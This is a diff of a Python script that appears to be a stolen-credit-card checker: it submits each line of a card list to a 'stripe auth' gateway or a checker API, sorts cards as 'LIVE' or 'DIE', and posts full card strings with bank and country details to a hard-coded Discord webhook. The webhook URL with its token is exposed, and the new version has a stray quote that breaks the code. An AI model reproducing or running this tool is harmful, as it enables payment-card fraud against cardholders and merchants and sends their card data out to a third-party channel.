@@ -1,28 +1,22 @@
 import requests
 import json
-import urllib.parse
 import time
 
 INPUT_FILE = "list.txt"
-BASE_URL = "https://titanautostripeauth.onrender.com/gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc="
-WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"
+API_URL = "https://api.chkr.cc/"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM""
 
-approved = []
-declined = []
-unknown = []
-errors = []
+approved, declined, unknown, errors = [], [], [], []
 
 
 def send_embed(title, description, color):
     payload = {
-        "embeds": [
-            {
-                "title": title,
-                "description": description[:4090],
-                "color": color,
-                "footer": {"text": "String Logger"}
-            }
-        ]
+        "embeds": [{
+            "title": title,
+            "description": description[:4090],
+            "color": color,
+            "footer": {"text": "String Checker"}
+        }]
     }
     try:
         requests.post(WEBHOOK_URL, json=payload, timeout=10)
@@ -30,103 +24,95 @@ def send_embed(title, description, color):
         pass
 
 
-def classify_by_status(status, message):
-    status = str(status).lower()
-    message = str(message).lower()
-
-    if status in ["approved", "success", "live"]:
+def classify_from_code(code):
+    if code == 1:
         return "approved"
-    if status in ["declined", "dead"]:
+    if code == 0:
         return "declined"
-
-    if any(w in message for w in ["approved", "success", "charged", "live"]):
-        return "approved"
-    if any(w in message for w in ["declined", "dead", "incorrect", "expired", "cvc", "cvv", "blocked"]):
-        return "declined"
-
     return "unknown"
 
 
 with open(INPUT_FILE, "r", encoding="utf-8") as f:
     lines = f.read().splitlines()
 
-send_embed("Checker Started", "Checking started…", 3447003)
-
+send_embed("Checker Started", "POST checking started…", 3447003)
 
 for index, line in enumerate(lines, start=1):
     if not line.strip():
         continue
 
-    url = BASE_URL + urllib.parse.quote(line)
-
     try:
-        r = requests.get(url, timeout=30)
+        r = requests.post(API_URL, data={"data": line}, timeout=30)
         data = r.json()
 
-        # ✅ Read new format
-        response_msg = data.get("response")
-        status = data.get("status")
+        # 🔹 Main fields
+        code = data.get("code", 2)
+        status = data.get("status", "Unknown")
+        message = data.get("message", "No message")
 
-        # ✅ Fallback old format
-        if not response_msg:
-            resp_obj = data.get("Response", {})
-            response_msg = resp_obj.get("message") or resp_obj.get("raw_response") or "No message"
-            status = status or resp_obj.get("status") or "Unknown"
+        # 🔹 Card object (safe reads)
+        card = data.get("card", {})
+        card_string = card.get("card", line)
+        bank = card.get("bank", "N/A")
+        ctype = card.get("type", "N/A")
+        category = card.get("category", "N/A")
+        brand = card.get("brand", "N/A")
 
-        # ✅ Classification
-        category = classify_by_status(status, response_msg)
+        country = card.get("country", {})
+        country_name = country.get("name", "N/A")
+        country_code = country.get("code", "N/A")
+        country_emoji = country.get("emoji", "")
 
-        # ✅ DISPLAY STRING + RESPONSE + STATUS
+        result = classify_from_code(code)
+
         record = (
-            f"string `{line}`\n"
-            f"response {response_msg}\n"
-            f"status {status}"
+            f"string `{card_string}`\n"
+            f"status {status}\n"
+            f"message {message}\n\n"
+            f"bank {bank}\n"
+            f"type {ctype}\n"
+            f"category {category}\n"
+            f"brand {brand}\n"
+            f"country {country_name} {country_emoji} ({country_code})"
         )
 
-        if category == "approved":
+        if result == "approved":
             approved.append(record)
-            send_embed("✅ APPROVED", record, 3066993)
+            send_embed("✅ LIVE", record, 3066993)
 
-        elif category == "declined":
+        elif result == "declined":
             declined.append(record)
-            send_embed("❌ DECLINED", record, 15158332)
+            send_embed("❌ DIE", record, 15158332)
 
         else:
             unknown.append(record)
             send_embed("⚠ UNKNOWN", record, 15844367)
 
-        print(f"[{index}] {category.upper()} -> {response_msg}")
-
-        # Delay handling
-        if "too many requests" in str(response_msg).lower():
-            time.sleep(5)
-        else:
-            time.sleep(2.5)
+        print(f"[{index}] {status.upper()} → {message}")
+        time.sleep(2.5)
 
     except json.JSONDecodeError:
-        record = f"string `{line}`\nresponse Invalid JSON\nstatus Error"
+        record = f"string `{line}`\nresponse Invalid JSON"
         errors.append(record)
         send_embed("🚫 ERROR", record, 9807270)
         time.sleep(3)
 
     except Exception as e:
-        record = f"string `{line}`\nresponse {str(e)}\nstatus Error"
+        record = f"string `{line}`\nerror {e}"
         errors.append(record)
         send_embed("🚫 ERROR", record, 9807270)
         time.sleep(3)
 
 
 # Save results
-open("approved.txt", "w", encoding="utf-8").write("\n".join(approved))
-open("declined.txt", "w", encoding="utf-8").write("\n".join(declined))
-open("unknown.txt", "w", encoding="utf-8").write("\n".join(unknown))
-open("error.txt", "w", encoding="utf-8").write("\n".join(errors))
+open("approved.txt", "w").write("\n".join(approved))
+open("declined.txt", "w").write("\n".join(declined))
+open("unknown.txt", "w").write("\n".join(unknown))
+open("error.txt", "w").write("\n".join(errors))
 
-
-# Final summary
 summary = (
-    f"✅ Approved: {len(approved)}\n"
-    f"❌ Declined: {len(declined)}\n"
+    f"✅ Live: {len(approved)}\n"
+    f"❌ Die: {len(declined)}\n"
     f"⚠ Unknown: {len(unknown)}\n"
     f"🚫 Errors: {len(errors)}"
 )
@@ -134,3 +120,4 @@ summary = (
 send_embed("Finished Checking", summary, 5763719)
 print("\n✅ DONE CHECKING")
 print(summary)
+
